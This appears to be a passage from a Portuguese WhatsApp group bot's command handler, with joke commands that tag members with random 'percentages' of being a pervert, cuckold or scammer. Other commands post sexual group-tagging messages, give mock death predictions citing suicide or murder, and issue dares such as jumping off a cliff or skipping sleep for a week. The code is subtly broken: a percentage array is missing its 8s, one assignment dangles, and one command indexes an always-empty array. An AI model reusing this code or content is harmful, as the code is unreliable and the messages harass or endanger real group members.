const suamae251 = groupMembers
const teupai117 = suamae121[Math.floor(Math.random() * suamae121.length)]
const teupai251 = suamae251[Math.floor(Math.random() * suamae251.length)]
var shipted11 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipteddd = shipted11[Math.floor(Math.random() * shipted11.length)]
jet = `*Hmmm....  alma-gemeas eles 2 💘💘*\n\n1= @${teupai117.id.split('@')[0]}\ne esse\n2= @${teupai251.id.split('@')[0]}\ncom uma porcentagem de: ${shipteddd}`
membr.push(teupai117.id)
membr.push(teupai251.id)
mentions(jet, membr, true)
break


case 'punheteiro':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (!isGroup) return reply(`Só pode ser utilizado este comando, em grupo.`)
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
const aletl = `${Math.floor(Math.random() * 105)}`
reply(`@${blamention_id.split("@")[0]} Aguarde, confiscando sua porcentagem...`)
await delay(7000)
reply(`「 @${blamention_id.split("@")[0]} 」Sua Porcentagem De punheteiro é De : ${aletl}%`)
break

case 'dogolpe':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if(!menc_os2 || menc_jid2[1]) return reply('Marque a mensagem com o comando ou marque o @ do usuário..')
random = `${Math.floor(Math.random() * 100)}`
amy.sendMessage(from, {text:`🚨 Golpista localizado: *@${menc_os2.split("@")[0]}*\n— *Porcentagem de golpe:* ${random}%\n*Aviso:* _Ele(a) gosta de ferir sentimentos.._`, mentions: [menc_os2]})
break

case 'maconheiro': case 'maconheira':
if(!isGroup) return reply(`Só pode ser utilizado este comando, em grupo.`)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
var maconheiroNumbers = [];
for (let i = 1; i <= 100; i++) {
maconheiroNumbers.push(i.toString());
}
var maconheiro = maconheiroNumbers[Math.floor(Math.random() * maconheiroNumbers.length)];
const maconheiroImageMessage = {
image: { url: "https://telegra.ph/file/1649e82841eaa55edbb81.jpg" },
caption: `vamos ver o quanto maconheiro vc é\n\nSua porcentagem de ${command} é: ${maconheiro}%\n 🍁💨`
};
amy.sendMessage(from, maconheiroImageMessage);
break;

case 'pervertido':
if(!isGroup) return reply(`Só pode ser utilizado este comando, em grupo.`)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
var pervertidoNumbers = [];
for (let i = 1; i <= 100; i++) {
pervertidoNumbers.push(i.toString());
}
var pervertido = pervertidoNumbers[Math.floor(Math.random() * pervertidoNumbers.length)];
const pervertidoImageMessage = {
image: { url: "https://telegra.ph/file/4cbafc0e0ff6cf26b7bd0.jpg" },
caption: `vamos ver o quanto pervertido vc é\n\nSua porcentagem de 「${command}」é: ${pervertido}%\n 😏🔞`
};
amy.sendMessage(from, pervertidoImageMessage);
break;


case 'guloso':// by lucas mod domina 
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
amy.sendMessage(from, {text:`Pesquisando a ficha de ${command} da (o) @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: info})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
amy.sendMessage(from, {video: {url: 'https://telegra.ph/file/b90bef1238cd79d46cc38.mp4'}, gifPlayback: true, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa ${command}?\n• A porcentagem de chance é *${random}%*`, mentions: [sender_ou_n]}, {quoted: info})
}, 7000)
break


case 'gadometro':
case 'nivelgado':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
const chifre = ["🐄 ultra extreme gado 🐄",
"🤴 Gado-Master 🤴",
"👑 Gado-Rei 👑",
"🐄 Gado 🐄",
"🤡 Escravo-ceta 🤡",
"🙇‍♂️ Escravo-ceta Maximo 🙇‍♂️",
"🦄 Gacorno? 🦄",
"🔥 Jogador De Forno Livre<3 🔥",
"🔮 Mestre Do Frifai<3<3 🔮",
"🐮 Gado-Manso 🐮",
"🌾 Gado-Conformado 🌾",
"🐂 Gado-Incubado 🐂",
"🌟 Gado Deus 🌟",
"🎩 Mestre dos Gados 🎩",
"💔 Topa tudo por buceta 💔",
"🐮 Gado Comum 🐮",
"🐄 Mini Gadinho 🐄",
"🌱 Gado Iniciante 🌱",
"🔰 Gado Basico 🔰",
"⚙️ Gado Intermediario ⚙️",
"💎 Gado Avançado 💎",
"🌈 Gado Profisional 🌈",
"🔝 Gado Mestre 🔝",
"🦌 Gado Chifrudo 🦌",
"🤏 Corno Conformado 🤏",
"🦌 Corno HiperChifrudo 🦌",
"👑 Chifrudo Deus 👑",
"👑 Mestre dos Chifrudos 👑",
"🌾 Gado Livre 🌾",
"💖 Gado Encantador 💖",
"👑 Gado Supremo 👑",
"🏡 Gado da Fazenda 🏡",
"💘 Gado do Amor 💘",
"💑 Gado Romântico 💑",
"💗 Gado Apaixonado 💗",
"🌙 Gado Sonhador 🌙",
"💚 Gado Fiel 💚",
"🔒 Gado Determinado 🔒",
"📈 Gado em Ascensão 📈",
"🧠 Gado Realista 🧠",
"💓 Gado de Coração 💓",
"💡 Gado Inspirador 💡",
"💪 Gado Conquistador 💪",
"🌟 Gado Confiante 🌟",
"😄 Gado Irresistível 😄",
"😍 Gado Encantador 😍",
"🥰 Gado Carinhoso 🥰",
"😎 Gado Charmoso 😎",
"🤣 Gado Divertido 🤣",
"😂 Gado Engraçado 😂"];
const gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `EI CORNINHO MANSO, VC É ${gado} 😅`
reply(hisil)
break;


case 'morte':
case 'previsao':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
amy.sendMsg = await amy.sendMessage(from, { react: { text: '☠️', key: info.key } });
const idade2 = ["30", "76", "25", "32", "27", "90", "72", "83", "73", "83", "74", "92", "100", "94", "48", "37", "53", "63"];
const idade = idade2[Math.floor(Math.random() * idade2.length)];
const causasMorte = [
"💀 Causa desconhecida",
"💔 Doença cardíaca",
"🚗 Acidente de carro",
"🩸 Câncer",
"☠️ Envenenamento",
"🛩️ Queda de um avião",
"🌊 Afogamento",
"🦈 Ataque de tubarão",
"🔨 Acidente de trabalho",
"🔪 Assassinato",
"🔫 Suicídio",
"💥 Explosão",
"🌪️ Desastre natural",
"💊 Overdose de drogas",
"🔥 Ferimento fatal",
"⛵ Acidente de barco",
"🏍️ Acidente de motocicleta",
"🌷 Eletrocussão",
"🔥 Combustão espontânea",
"🚲 Acidente de bicicleta"
];
const causaMorte = causasMorte[Math.floor(Math.random() * causasMorte.length)];
const morte = `𝗘𝗶, 𝗮𝗺𝗶𝗴𝘂𝗶𝗻𝗵𝗼 ${pushname}! 𝗦𝗲𝗴𝘂𝗻𝗱𝗼 𝗼𝘀 𝗰𝗮́𝗹𝗰𝘂𝗹𝗼𝘀 𝗳𝗲𝗶𝘁𝗼𝘀 𝗽𝗼𝗿 𝗘𝗶𝗻𝘀𝘁𝗲𝗶𝗻, 𝘃𝗼𝗰𝗲̂ 𝘃𝗮𝗶 𝗺𝗼𝗿𝗿𝗲𝗿 𝗰𝗼𝗺 ${idade} 𝗮𝗻𝗼𝘀. 😱\n\n𝗖𝗮𝘂𝘀𝗮: ${causaMorte}!`;
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/66c9beff8806d0b1c023d.jpg' }, caption: morte}, {quoted: info})
break;

case 'chance':
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (!isGroup) return reply(msg.grupo)
rate = body.slice(7)
zxzz = 
random = `${Math.floor(Math.random() * 200)}`
reply(' 😱 A chance disso que você falou vai acontecer e de:❰ '+random+'% ❱ ✧ ')
break

case 'quando':
if (args.length < 1) return reply('Digite a pergunta!')
const meupirul = ['Hoje', 'Amanhã', 'Nunca', 'dia', 'semana', 'mês', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'Amanhã' || randomm == 'Nunca') {
text = `Pergunta: ${body.slice(1)}\nResposta: ${randomm}`
} else if (random2 == 1) {
text = `Pergunta: ${body.slice(1)}\nResposta:1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
text = `Pergunta: ${body.slice(1)}\nResposta: ${random2} ${random3}`
}
reply(text)
break


case 'surubao': case 'suruba':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (Number(q)) return reply(`Eita, coloque o número de pessoas após o comando.`)
if (Number(q.trim()) < 10) return reply("Coloque um número menor, ou seja, menos de *10*.")
somembros = []
emojiskk = ["🥵", "😈", "🫣", "😏"]
emojis = emojiskk[Math.floor(Math.random() * emojiskk.length)]  
frasekk = [`tá querendo relações sexuais a ${q}, topa?`, `quer que *${q}* pessoas venham de *chicote, algema e corda de alpinista*.`, `quer que ${q} pessoas der tapa na cara, lhe chame de cachorra e fud3r bem gostosinho...`]
context = frasekk[Math.floor(Math.random() * frasekk.length)]  
ABC = `${emojis} @${sender.split('@')[0]} ${context}\n\n`
for (var i = 0; i < q; i++) {
ABC += `@${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
mencionarIMG(ABC, suruba);
break;

case 'tapa':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('𝗠𝗮𝗿𝗾𝘂𝗲 𝗼 𝗮𝗹𝘃𝗼 𝗾𝘂𝗲 𝘃𝗼𝗰𝗲̂ 𝗱𝗲𝘀𝗲𝗷𝗮𝗿 𝗱𝗮 𝗼 𝘁𝗮𝗽𝗮 𝗻𝗮 𝗿𝗮𝗯𝗮.')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce ̂ acabou de dar um tapa gostoso na(o) 😏 @${mentioned[0].split('@')[0]} 🔥` 
jrq = await getBuffer(`${tapinha}`)
await amy.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'beijo':
case 'beijar':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque alguem para dar o beijo')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} 😁👉👈❤` 
wew = await getBuffer(`${beijin}`)
await amy.sendMessage(from, {video: wew, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'matar': case 'mata':  
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem vc que matar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce acabou de matar o (a) @${mentioned[0].split('@')[0]} 😈👹` 
jrpp = await getBuffer(`${matei}`)
await amy.sendMessage(from, {video: jrpp, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'soco':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem voce que dar o soco')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Você deu um  socão no (a) @${mentioned[0].split('@')[0]} 🤡` 
jrq = await getBuffer(`${soquin}`)
await amy.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem voce quer chutar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Você acabou de dar um chute na(o) @${mentioned[0].split('@')[0]} 🤡` 
jry = await getBuffer(`${chutin}`)
await amy.sendMessage(from, {video: jry, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break 

case 'desafio': 
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`𝙊𝙡𝙖 ${pushname} 𝙀𝙨𝙩𝙚 𝙩𝙞𝙥𝙤 𝙙𝙚 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙨𝙤́ 𝙥𝙤𝙙𝙚 𝙨𝙚𝙧 𝙪𝙩𝙞𝙡𝙞𝙯𝙖𝙙𝙤 𝙘𝙤𝙢 𝙤 𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 𝙖𝙩𝙞𝙫𝙤, 𝙛𝙖𝙡𝙚 𝙘𝙤𝙢 𝙪𝙢 𝙖𝙙𝙢 𝙤𝙪 𝙨𝙚 𝙫𝙤𝙘𝙚̂ 𝙛𝙤𝙧, 𝙖𝙥𝙚𝙣𝙖𝙨 𝙙𝙞𝙜𝙞𝙩𝙚 ${prefix}𝙢𝙤𝙙𝙤𝙗𝙧𝙞𝙣𝙘𝙖𝙙𝙚𝙞𝙧𝙖 1 👩🏻‍💻`)  
{
const desafios = [
'𝘋𝘦𝘴𝘢𝘧𝘪𝘰 𝘷𝘰𝘤𝘦̂ a 𝘤𝘰𝘮𝘦𝘳 uma colher de 𝘱𝘪𝘮𝘦𝘯𝘵𝘢 🌶️',
'Desafio 𝘷𝘰𝘤𝘦̂ 𝘢 𝘱𝘶𝘭𝘢𝘳 𝘥𝘦 𝘶𝘮 penhasco 🏞️',
'𝘋𝘦𝘴𝘢𝘧𝘪𝘰 você a passar uma 𝘴𝘦𝘮𝘢𝘯𝘢 sem 𝘥𝘰𝘳𝘮𝘪𝘳 😴',
'Desafio você a andar descalço sobre brasas 🔥',
'Desafio você a nadar com tubarões 🦈',
'Desafio você a cantar em público 🎤',
'Desafio você a fazer um salto de paraquedas 🪂',
'Desafio você a passar um dia inteiro sem usar o celular 📱',
'Desafio você a dançar no topo de um prédio 🕺',
'Desafio você a fazer uma tatuagem surpresa 🖌️',
'Desafio você a atravessar um rio a nado 🏊',
'Desafio você a aprender a andar de skate em um dia 🛹',
'Desafio você a fazer uma maratona de filmes em 24 horas 🎬',
